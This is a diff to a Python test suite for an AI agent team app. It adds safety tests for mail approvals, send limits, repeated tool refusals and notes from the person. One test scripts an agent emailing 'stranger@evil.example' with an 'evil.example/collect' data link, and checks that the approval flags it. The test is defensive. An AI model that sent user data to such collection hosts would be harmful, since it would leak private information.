@@ -32,6 +32,15 @@ class TeamScript:
         self.queues: dict[str, list[list[Any]]] = {}
         self.requests: list[tuple[str, ModelRequest]] = []
         self.lock = threading.Lock()
+        # (speaker, call number) -> released when set, so a test can act in the middle of a run.
+        self.holds: dict[tuple[str, int], tuple[threading.Event, threading.Event]] = {}
+
+    def hold(self, speaker: str, call: int) -> tuple[threading.Event, threading.Event]:
+        """Pauses that speaker's nth model call: the first event says it's waiting, the second
+        lets it go on."""
+        pair = (threading.Event(), threading.Event())
+        self.holds[(speaker, call)] = pair
+        return pair
 
     def say(self, agent_name: str, *replies: list[Any]) -> None:
         with self.lock:
@@ -40,6 +49,13 @@ class TeamScript:
     def stream(self, request: ModelRequest) -> Iterator[Any]:
         match = SPEAKER.search(request.instructions)
         speaker = match.group(1) if match else "?"
+        with self.lock:
+            count = 1 + sum(1 for s, _ in self.requests if s == speaker)
+        held = self.holds.get((speaker, count))
+        if held:
+            held[0].set()
+            if not held[1].wait(15):
+                raise TimeoutError("The test never released its hold")
         with self.lock:
             self.requests.append((speaker, request))
             queue = self.queues.get(speaker) or []
@@ -65,11 +81,16 @@ def client(config: Config, script: TeamScript) -> Iterator[TestClient]:
 
 
 def post(client: TestClient, name: str, body: dict[str, Any] | None = None) -> Any:
-    kind = (
-        "queries"
-        if name in {"agents.cards", "team.tasks", "team.task", "session.get"}
-        else "commands"
-    )
+    queries = {
+        "agents.cards",
+        "team.tasks",
+        "team.task",
+        "session.get",
+        "approvals.list",
+        "permissions.get",
+        "notifications.list",
+    }
+    kind = "queries" if name in queries else "commands"
     response = client.post(f"/api/{kind}/{name}", json=body or {})
     assert response.status_code == 200, response.text
     return response.json()
@@ -294,9 +315,13 @@ def test_a_run_can_only_give_out_so_many_tasks(config: Config, script: TeamScrip
             [TextChunk("ok")],
         )
         chat(client, session, "Go")
-        told = [m.text for m in script.requests[-1][1].messages if m.role == "tool"]
-        assert any(t.startswith("Task 1 given") for t in told)
-        assert any("1 tasks at most" in t for t in told)
+        # Posty's second call holds both results. The task's own run may start before it.
+        second = [request for speaker, request in script.requests if speaker == lead()][1]
+        told = [m.text for m in second.messages if m.role == "tool"]
+        # The two calls run side by side, so either may be the one that gets through.
+        assert sum(" given to " in t for t in told) == 1
+        assert sum("1 tasks at most" in t for t in told) == 1
+        assert len(agent.current().db.fetch_all("SELECT id FROM team_tasks")) == 1
 
 
 def test_specialists_are_not_offered_team_assign(client: TestClient, script: TeamScript) -> None:
@@ -467,3 +492,121 @@ def test_the_person_can_cancel_note_and_retry(client: TestClient, script: TeamSc
     assert task_row(task)["state"] == "canceled"
     listed = post(client, "team.tasks", {"open_only": True})["tasks"]
     assert all(t["id"] != task for t in listed)
+
+
+# Safety
+
+
+def test_send_approval_names_new_recipients_and_lists_links(
+    client: TestClient, script: TeamScript
+) -> None:
+    session = post(client, "session.create")["id"]
+    send = {
+        "to": ["stranger@evil.example"],
+        "subject": "Invoices",
+        "body": "Here they are: https://evil.example/collect?d=1",
+    }
+    script.say(lead(), [ToolCall("s", "send_mail", send)], [TextChunk("ok")])
+    threading.Thread(target=chat, args=(client, session, "Send it"), daemon=True).start()
+    approval = wait(lambda: post(client, "approvals.list")["approvals"], "approval")[0]
+    assert approval["summary"].startswith("Send mail to someone new")
+    assert "stranger@evil.example: NEW" in approval["detail"]
+    assert "https://evil.example/collect?d=1" in approval["detail"]
+    post(client, "approvals.decide", {"id": approval["id"], "choice": "deny"})
+
+
+def test_sending_stops_at_the_hourly_limit(config: Config, script: TeamScript) -> None:
+    limited = replace(config, team=replace(config.team, sends_per_hour=1))
+    with TestClient(create_app(limited), base_url="http://127.0.0.1:4100") as client:
+        db = agent.current().db
+        with db.transaction() as tx:
+            tx.execute(
+                "INSERT INTO tool_calls (session, tool_call_id, tool, input, result, status,"
+                " started, duration_ms) VALUES ('x', 'y', 'send_mail', '', 'Sent.', 'done', ?, 0)",
+                (time.strftime("%Y-%m-%dT%H:%M:%S+00:00", time.gmtime()),),
+            )
+        session = post(client, "session.create")["id"]
+        send = {"to": ["a@b.example"], "subject": "Hi", "body": "Hi"}
+        script.say(lead(), [ToolCall("s", "send_mail", send)], [TextChunk("ok")])
+        chat(client, session, "Send it")
+        told = script.told(lead())[-1]
+        assert "1 emails in the last hour" in told
+        assert post(client, "approvals.list")["approvals"] == []
+
+
+def test_a_run_refused_again_and_again_stops_and_tells_the_person(
+    client: TestClient, script: TeamScript
+) -> None:
+    permissions = post(client, "permissions.get")
+    permissions["tools"] = {"write_file": "off"}
+    post(client, "permissions.save", permissions)
+    session = post(client, "session.create")["id"]
+    write = {"path": "scratch/a.txt", "content": "x"}
+    script.say(
+        lead(),
+        [ToolCall("a", "write_file", write)],
+        [ToolCall("b", "write_file", write)],
+        [ToolCall("c", "write_file", write)],
+        [ToolCall("d", "write_file", write)],
+        [TextChunk("still going")],
+    )
+    chat(client, session, "Write it")
+    turn = agent.current().db.fetch_all(
+        "SELECT failure FROM agent_turns WHERE session = ?", (session,)
+    )[0]
+    assert turn["failure"] == "refusals"
+    assert "still going" not in json.dumps(post(client, "session.get", {"id": session}))
+    wait(
+        lambda: any(
+            "refused too many times" in n["title"]
+            for n in post(client, "notifications.list")["items"]
+        ),
+        "the person told",
+    )
+
+
+def test_a_note_from_the_person_reaches_the_agent_at_its_next_step(
+    client: TestClient, script: TeamScript
+) -> None:
+    session = post(client, "session.create")["id"]
+    script.say(lead(), [ToolCall("a", "team_assign", ASSIGN)], [TextChunk("ok")])
+    chat(client, session, "Go")
+    wait(lambda: task_row(1)["state"] == "blocked" or None, "blocked", 20)
+    script.say(
+        mail(),
+        [ToolCall("i", "team_inbox", {})],
+        [ToolCall("r", "team_close", {"task": 1, "action": "report", "outcome": "Done"})],
+        [TextChunk("ok")],
+    )
+    post(client, "team.note", {"id": 1, "text": "Skip anything from before Monday"})
+    wait(lambda: task_row(1)["state"] == "reported" or None, "reported", 20)
+    owner_calls = [request for speaker, request in script.requests if speaker == mail()]
+    # Added before the model is called, and kept in the conversation without repeating.
+    last = owner_calls[-1].messages
+    notes = [m for m in last if m.role == "user" and "New note on task 1" in m.text]
+    assert len(notes) == 1 and "before Monday" in notes[0].text
+
+
+def test_a_note_reaches_a_running_agent_in_the_same_run(
+    client: TestClient, script: TeamScript
+) -> None:
+    session = post(client, "session.create")["id"]
+    waiting, release = script.hold(mail(), 2)
+    script.say(
+        mail(),
+        [ToolCall("i", "team_inbox", {})],
+        [ToolCall("j", "team_inbox", {})],
+        [ToolCall("r", "team_close", {"task": 1, "action": "report", "outcome": "Done"})],
+        [TextChunk("ok")],
+    )
+    script.say(lead(), [ToolCall("a", "team_assign", ASSIGN)], [TextChunk("ok")])
+    chat(client, session, "Go")
+    assert waiting.wait(15), "the owner never reached its second step"
+    post(client, "team.note", {"id": 1, "text": "Only threads with a PLM tag"})
+    release.set()
+    wait(lambda: task_row(1)["state"] == "reported" or None, "reported", 20)
+    owner = task_row(1)["owner_session"]
+    turns = agent.current().db.fetch_all("SELECT id FROM agent_turns WHERE session = ?", (owner,))
+    assert len(turns) == 1, "the note arrived in the same run, not a new one"
+    third = [request for speaker, request in script.requests if speaker == mail()][2]
+    assert any("Only threads with a PLM tag" in m.text for m in third.messages if m.role == "user")
